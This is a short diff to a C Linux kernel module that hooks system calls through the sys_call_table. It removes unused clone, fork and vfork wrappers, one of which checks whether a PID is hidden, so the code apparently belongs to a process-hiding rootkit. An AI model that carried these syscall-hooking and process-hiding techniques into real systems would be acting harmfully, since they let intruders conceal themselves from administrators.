@@ -482,38 +482,6 @@ asmlinkage void new_sys_exit_group(int error_code)
 	ksyms.old_sys_exit_group(error_code);
 }
 
-asmlinkage long new_sys_clone(unsigned long flags, void *child_stack,
-				void *ptid, void *ctid, void *regs)
-{
-	register int pid_hidden = 0;
-	long pid;
-
-	if (flags & (CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD))
-		pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());
-
-	pid = ksyms.old_sys_clone(flags, child_stack, ptid, ctid, regs);
-
-	return pid;
-}
-
-asmlinkage long new_sys_fork(void)
-{
-	pid_t pid;
-	//register int pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());
-
-	pid = ksyms.old_sys_fork();
-	if (pid)
-		pr_debug("%s: pid=%d\n", __func__, pid);
-
-	return pid;
-}
-
-asmlinkage long new_sys_vfork(void)
-{
-	/* TODO */
-	return ksyms.old_sys_vfork();
-}
-
 asmlinkage long new_sys_reboot(int magic1, int magic2, int cmd, void *arg)
 {
 	return ksyms.old_sys_reboot(magic1, magic2, cmd, arg);
@@ -636,9 +604,6 @@ int hook_sys_call_table(void)
 	HOOK(perf_event_open, new_sys_perf_event_open);
 	HOOK(exit, new_sys_exit);
 	HOOK(exit_group, new_sys_exit_group);
-	//HOOK(clone, new_sys_clone);
-	//HOOK(fork, new_sys_fork);
-	//HOOK(vfork, new_sys_vfork);
 
 	HOOK(reboot, new_sys_reboot);
 
